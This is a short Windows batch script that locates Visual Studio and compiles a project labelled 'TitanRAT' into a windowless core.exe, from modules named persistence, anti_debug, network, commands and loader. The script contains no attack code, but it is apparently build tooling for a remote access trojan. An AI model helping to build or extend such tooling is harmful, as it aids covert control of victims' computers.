@echo off
setlocal

pushd "%~dp0" >nul

echo [TitanRAT] Searching for Visual Studio...
set "VCVARS="
if exist "C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Auxiliary\Build\vcvars64.bat" (
    set "VCVARS=C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Auxiliary\Build\vcvars64.bat"
) else if exist "C:\Program Files\Microsoft Visual Studio\2022\Professional\VC\Auxiliary\Build\vcvars64.bat" (
    set "VCVARS=C:\Program Files\Microsoft Visual Studio\2022\Professional\VC\Auxiliary\Build\vcvars64.bat"
) else if exist "C:\Program Files\Microsoft Visual Studio\2019\Community\VC\Auxiliary\Build\vcvars64.bat" (
    set "VCVARS=C:\Program Files\Microsoft Visual Studio\2019\Community\VC\Auxiliary\Build\vcvars64.bat"
) else (
    echo [!] Visual Studio C++ tools not found.
    pause
    exit /b 1
)
echo [+] Found: %VCVARS%
call "%VCVARS%" >nul 2>&1
if errorlevel 1 (
    echo [!] Failed to initialize MSVC environment.
    pause
    exit /b 1
)

echo [*] Compiling...
cl /nologo /EHsc /O2 main.cpp persistence.cpp anti_debug.cpp network.cpp commands.cpp loader.cpp compression.cpp /link /SUBSYSTEM:WINDOWS /OUT:core.exe kernel32.lib user32.lib advapi32.lib shell32.lib ole32.lib shlwapi.lib ws2_32.lib winhttp.lib crypt32.lib

if errorlevel 1 (
    echo [!] Compilation failed
    pause
    exit /b 1
)

echo [+] Build successful: core.exe
pause
popd >nul
exit /b 0